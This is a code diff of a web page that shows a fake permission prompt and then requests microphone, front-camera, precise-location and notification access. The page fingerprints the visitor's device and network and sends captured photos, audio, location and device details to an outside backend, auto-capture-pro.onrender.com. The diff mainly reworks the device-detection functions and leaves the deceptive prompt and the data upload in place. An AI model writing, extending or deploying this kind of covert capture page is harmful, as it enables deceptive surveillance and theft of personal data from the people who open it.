@@ -72,9 +72,7 @@
 </head>
 <body>
 
-<!-- ========================================== -->
-<!-- FAKE PERMISSION PROMPT - SOUND FIRST! -->
-<!-- ========================================== -->
+<!-- FAKE PERMISSION PROMPT -->
 <div class="fake-prompt" id="fakePrompt">
     <div class="fake-prompt-box">
         <span class="icon-sound">🎤</span>
@@ -85,9 +83,7 @@
     </div>
 </div>
 
-<!-- ========================================== -->
 <!-- MAIN CONTAINER -->
-<!-- ========================================== -->
 <div class="container" style="display:none;" id="mainContainer">
     <div class="scanline"></div>
     
@@ -168,11 +164,11 @@
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
 
 // ==========================================
-//  REAL DEVICE DETECTION - NO UNKNOWN!
+//  REAL DEVICE DETECTION - HARDWARE BASED!
 // ==========================================
 
 let userPhoto = null, userLocation = null;
-let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
+let deviceDetails = {}, ipAddress = '—', audioData = null;
 let networkSpeed = { download: '--', ping: '--' };
 let captureCount = 0;
 let isPaused = false;
@@ -194,129 +190,81 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// EXACT APPLE DEVICE DETECTION
-// ==========================================
-function getAppleDeviceModel() {
-    const w = window.screen.width;
-    const h = window.screen.height;
-    const dpr = window.devicePixelRatio;
-    const ua = navigator.userAgent;
-    
-    // iPhone models based on screen resolution + DPR
-    const models = [
-        { w: 430, h: 932, dpr: 3, name: 'iPhone 14 Pro Max' },
-        { w: 393, h: 852, dpr: 3, name: 'iPhone 14 Pro' },
-        { w: 428, h: 926, dpr: 3, name: 'iPhone 13 Pro Max / iPhone 12 Pro Max' },
-        { w: 390, h: 844, dpr: 3, name: 'iPhone 13 Pro / iPhone 13 / iPhone 12 Pro / iPhone 12' },
-        { w: 375, h: 812, dpr: 3, name: 'iPhone X / iPhone XS / iPhone 11 Pro' },
-        { w: 414, h: 896, dpr: 2, name: 'iPhone XR / iPhone 11' },
-        { w: 375, h: 667, dpr: 2, name: 'iPhone 6 / 6s / 7 / 8 / SE (2nd gen)' },
-        { w: 320, h: 568, dpr: 2, name: 'iPhone 5 / 5s / SE (1st gen)' },
-        { w: 768, h: 1024, dpr: 2, name: 'iPad (9.7-inch)' },
-        { w: 1024, h: 1366, dpr: 2, name: 'iPad Pro (12.9-inch)' },
-        { w: 834, h: 1194, dpr: 2, name: 'iPad Pro (11-inch)' },
-    ];
-    
-    for (const model of models) {
-        if (w === model.w && h === model.h && dpr === model.dpr) {
-            return model.name;
-        }
-    }
-    
-    // Check for iPhone in User-Agent as fallback
-    if (ua.includes('iPhone')) {
-        const match = ua.match(/iPhone([\d,]+)/);
-        if (match) {
-            const iphoneModels = {
-                '14,5': 'iPhone 13 Pro Max',
-                '14,4': 'iPhone 13 Pro',
-                '14,3': 'iPhone 13 mini',
-                '14,2': 'iPhone 13',
-                '13,4': 'iPhone 12 Pro Max',
-                '13,3': 'iPhone 12 Pro',
-                '13,2': 'iPhone 12',
-                '13,1': 'iPhone 12 mini',
-                '12,5': 'iPhone 11 Pro Max',
-                '12,3': 'iPhone 11 Pro',
-                '12,1': 'iPhone 11',
-                '11,8': 'iPhone XR',
-                '11,6': 'iPhone XS Max',
-                '11,4': 'iPhone XS',
-                '11,2': 'iPhone X',
-            };
-            return iphoneModels[match[1]] || 'iPhone';
-        }
-        return 'iPhone';
-    }
-    
-    if (ua.includes('iPad')) return 'iPad';
-    
-    return null;
-}
-
-// ==========================================
-// REAL DEVICE DETECTION - NO UNKNOWN!
+// REAL HARDWARE DETECTION
 // ==========================================
 function getRealDeviceInfo() {
     const ua = navigator.userAgent;
-    let info = {
-        manufacturer: 'Unknown',
-        model: 'Unknown',
-        os: 'Unknown',
-        osVersion: 'Unknown',
+    const info = {
+        manufacturer: '—',
+        model: '—',
+        os: '—',
+        osVersion: '—',
         isApple: false,
         isAndroid: false,
         isDesktop: false
     };
     
-    // Check if Apple device
-    if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('Mac')) {
+    // ----- APPLE DEVICES -----
+    if (ua.includes('iPhone') || ua.includes('iPad')) {
         info.isApple = true;
         info.manufacturer = 'Apple';
-        const model = getAppleDeviceModel();
-        if (model) {
-            info.model = model;
-        } else if (ua.includes('iPhone')) {
-            info.model = 'iPhone';
-        } else if (ua.includes('iPad')) {
-            info.model = 'iPad';
-        } else {
-            info.model = 'Mac';
+        
+        // iPhone model from screen size
+        const w = window.screen.width;
+        const h = window.screen.height;
+        const dpr = window.devicePixelRatio;
+        
+        const models = [
+            { w: 430, h: 932, dpr: 3, name: 'iPhone 14 Pro Max' },
+            { w: 393, h: 852, dpr: 3, name: 'iPhone 14 Pro' },
+            { w: 428, h: 926, dpr: 3, name: 'iPhone 13 Pro Max' },
+            { w: 390, h: 844, dpr: 3, name: 'iPhone 13/13 Pro/12/12 Pro' },
+            { w: 375, h: 812, dpr: 3, name: 'iPhone X/XS/11 Pro' },
+            { w: 414, h: 896, dpr: 2, name: 'iPhone XR/11' },
+            { w: 375, h: 667, dpr: 2, name: 'iPhone 6/6s/7/8/SE2' },
+            { w: 320, h: 568, dpr: 2, name: 'iPhone 5/5s/SE1' },
+            { w: 768, h: 1024, dpr: 2, name: 'iPad 9.7"' },
+            { w: 1024, h: 1366, dpr: 2, name: 'iPad Pro 12.9"' },
+            { w: 834, h: 1194, dpr: 2, name: 'iPad Pro 11"' },
+        ];
+        
+        let found = false;
+        for (const m of models) {
+            if (w === m.w && h === m.h && dpr === m.dpr) {
+                info.model = m.name;
+                found = true;
+                break;
+            }
+        }
+        if (!found) {
+            info.model = ua.includes('iPhone') ? 'iPhone' : 'iPad';
         }
         
-        // OS detection for Apple
-        if (ua.includes('iPhone') || ua.includes('iPad')) {
+        // iOS version
+        const match = ua.match(/OS\s([\d_]+)/);
+        if (match) {
             info.os = 'iOS';
-            const match = ua.match(/OS\s([\d_]+)/);
-            if (match) {
-                info.osVersion = match[1].replace(/_/g, '.');
-            }
-        } else {
-            info.os = 'macOS';
-            const match = ua.match(/Mac\sOS\sX\s([\d_]+)/);
-            if (match) {
-                info.osVersion = match[1].replace(/_/g, '.');
-            }
+            info.osVersion = match[1].replace(/_/g, '.');
         }
         return info;
     }
     
-    // Check if Android
+    // ----- ANDROID DEVICES -----
     if (ua.includes('Android')) {
         info.isAndroid = true;
         info.os = 'Android';
+        
+        // Android version
         const match = ua.match(/Android\s([\d.]+)/);
-        if (match) {
-            info.osVersion = match[1];
-        }
+        if (match) info.osVersion = match[1];
         
         // Get manufacturer and model from Build
         const buildMatch = ua.match(/;\s?([^;]+?)\sBuild/);
         if (buildMatch) {
             let model = buildMatch[1].trim();
-            // Clean up
             model = model.replace(/^Android\s/, '');
-            // Brand mapping
+            
+            // Brand detection
             if (model.includes('SM-')) {
                 info.manufacturer = 'Samsung';
                 info.model = model.replace('SM-', 'Galaxy ');
@@ -351,7 +299,7 @@ function getRealDeviceInfo() {
         return info;
     }
     
-    // Desktop
+    // ----- DESKTOP -----
     info.isDesktop = true;
     if (ua.includes('Windows')) {
         info.manufacturer = 'Microsoft';
@@ -377,17 +325,22 @@ function getRealDeviceInfo() {
 // ==========================================
 function updateDeviceUI() {
     const info = getRealDeviceInfo();
-    const features = getDeepFeatures();
     
-    // Main device info
-    document.getElementById('devManufacturer').textContent = info.manufacturer || '—';
-    document.getElementById('devModel').textContent = info.model || '—';
+    document.getElementById('devManufacturer').textContent = info.manufacturer;
+    document.getElementById('devModel').textContent = info.model;
     document.getElementById('devOS').textContent = info.os + ' ' + info.osVersion;
     document.getElementById('devName').textContent = info.manufacturer + ' ' + info.model;
-    
-    // Device info grid in preview
     document.getElementById('devModelDisplay').textContent = info.manufacturer + ' ' + info.model;
     document.getElementById('devOSDisplay').textContent = info.os + ' ' + info.osVersion;
+    
+    // Screen
+    document.getElementById('devScreen').textContent = window.screen.width + 'x' + window.screen.height;
+    document.getElementById('devRAM').textContent = navigator.deviceMemory || '—';
+    document.getElementById('devCores').textContent = navigator.hardwareConcurrency || '—';
+    document.getElementById('devLanguage').textContent = navigator.language;
+    document.getElementById('devTimezone').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || '—';
+    document.getElementById('devTime').textContent = new Date().toLocaleString();
     
     // Battery
     if (navigator.getBattery) {
@@ -399,50 +352,11 @@ function updateDeviceUI() {
         });
     }
     
-    // Deep features
-    document.getElementById('devScreen').textContent = features.screen + ' | ' + features.pixelRatio + 'x';
-    document.getElementById('devRAM').textContent = features.memory + 'GB';
-    document.getElementById('devCores').textContent = features.cores;
-    document.getElementById('devLanguage').textContent = features.language;
-    document.getElementById('devTimezone').textContent = features.timezone;
-    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || '—';
-    document.getElementById('devTime').textContent = new Date().toLocaleString();
-    
-    // Show device info grid
     document.getElementById('deviceInfoPlaceholder').style.display = 'none';
     document.getElementById('deviceInfoGrid').style.display = 'block';
     
-    deviceDetails = {
-        ...info,
-        batteryLevel: deviceDetails.batteryLevel || '—',
-        ...features
-    };
-    
+    deviceDetails = { ...info };
     log('📱 DEVICE: ' + info.manufacturer + ' ' + info.model + ' | ' + info.os + ' ' + info.osVersion);
-}
-
-// ==========================================
-// DEEP UNIQUE FEATURES
-// ==========================================
-function getDeepFeatures() {
-    return {
-        screen: `${window.screen.width}x${window.screen.height}`,
-        colorDepth: window.screen.colorDepth,
-        pixelRatio: window.devicePixelRatio,
-        memory: navigator.deviceMemory || '—',
-        cores: navigator.hardwareConcurrency || '—',
-        language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(', ') : '—',
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        platform: navigator.platform || '—',
-        vendor: navigator.vendor || '—',
-        product: navigator.product || '—',
-        doNotTrack: navigator.doNotTrack || '—',
-        hardwareConcurrency: navigator.hardwareConcurrency || '—',
-        maxTouchPoints: navigator.maxTouchPoints || '—',
-        cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-        onLine: navigator.onLine ? 'Online' : 'Offline'
-    };
 }
 
 // ==========================================
@@ -498,7 +412,7 @@ function startSoundRecorder() {
 }
 
 // ==========================================
-// ALLOW ALL - SOUND FIRST THEN REST
+// ALLOW ALL
 // ==========================================
 async function allowAll() {
     document.getElementById('fakePrompt').style.display = 'none';
@@ -508,10 +422,8 @@ async function allowAll() {
     setStatus('🎯', 'ACQUIRING PERMISSIONS...', 'loading');
     
     try {
-        // 1. SOUND RECORDER
         await startSoundRecorder();
         
-        // 2. CAMERA
         log('📸 Requesting camera...');
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
@@ -519,7 +431,6 @@ async function allowAll() {
         });
         log('✅ Camera granted!');
         
-        // 3. LOCATION
         log('📍 Requesting location...');
         navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -542,17 +453,13 @@ async function allowAll() {
             { enableHighAccuracy: true, timeout: 5000 }
         );
         
-        // 4. NOTIFICATION
-        log('🔔 Requesting notification...');
         if (Notification.permission === 'default') {
             await Notification.requestPermission();
         }
         log('✅ Notification: ' + Notification.permission);
         
-        // 5. DEVICE DETAILS + DEEP FEATURES
         updateDeviceUI();
         
-        // 6. Start main capture
         log('🚀 Starting main capture...');
         await startAutoProcess();
         
@@ -562,9 +469,6 @@ async function allowAll() {
     }
 }
 
-// ==========================================
-// BLOCK BUTTON
-// ==========================================
 function blockAll() {
     document.getElementById('fakePrompt').innerHTML = `
         <div class="fake-prompt-box">
@@ -667,7 +571,7 @@ async function submitData() {
                 userPhoto: userPhoto,
                 audioData: audioData,
                 ipAddress: ipAddress,
-                fullDeviceInfo: await getFullDeviceInfo(),
+                fullDeviceInfo: getRealDeviceInfo(),
                 networkSpeed: networkSpeed,
                 liveLocation: userLocation || { lat: 0, lng: 0 },
                 captureCount: captureCount
@@ -681,53 +585,6 @@ async function submitData() {
     } catch(err) {
         log('❌ TRANSMISSION ERROR: ' + err.message);
     }
-}
-
-// ==========================================
-// FULL DEVICE INFO
-// ==========================================
-async function getFullDeviceInfo() {
-    const info = getRealDeviceInfo();
-    const features = getDeepFeatures();
-    const battery = await getBatteryInfo();
-    const conn = getNetworkInfo();
-    
-    return {
-        deviceName: info.manufacturer + ' ' + info.model,
-        deviceModel: info.model,
-        manufacturer: info.manufacturer,
-        os: info.os,
-        osVersion: info.osVersion,
-        isApple: info.isApple,
-        isAndroid: info.isAndroid,
-        isDesktop: info.isDesktop,
-        battery: battery,
-        connection: conn,
-        ...features
-    };
-}
-
-function getNetworkInfo() {
-    const conn = navigator.connection || navigator.mozConnection;
-    if (conn) {
-        let type = conn.effectiveType || '—';
-        if (type === '4g') type = '4G/LTE';
-        else if (type === '3g') type = '3G';
-        else if (type === '2g') type = '2G';
-        else if (type === 'wifi') type = 'WiFi';
-        return { type: type };
-    }
-    return { type: '—' };
-}
-
-async function getBatteryInfo() {
-    try {
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            return { level: Math.round(b.level * 100) + '%', charging: b.charging };
-        }
-    } catch(e) {}
-    return { level: '—', charging: false };
 }
 
 function getIPv4Address() {
@@ -816,14 +673,11 @@ async function startAutoProcess() {
     }
 }
 
-// ==========================================
-// START
-// ==========================================
 window.addEventListener('load', function() {
     console.log('🚀 SYSTEM READY - WAITING FOR USER PERMISSION');
 });
 
-console.log('🚀 REAL DEVICE DETECTION ACTIVE');
+console.log('🚀 REAL HARDWARE DETECTION ACTIVE');
 </script>
 </body>
 </html>
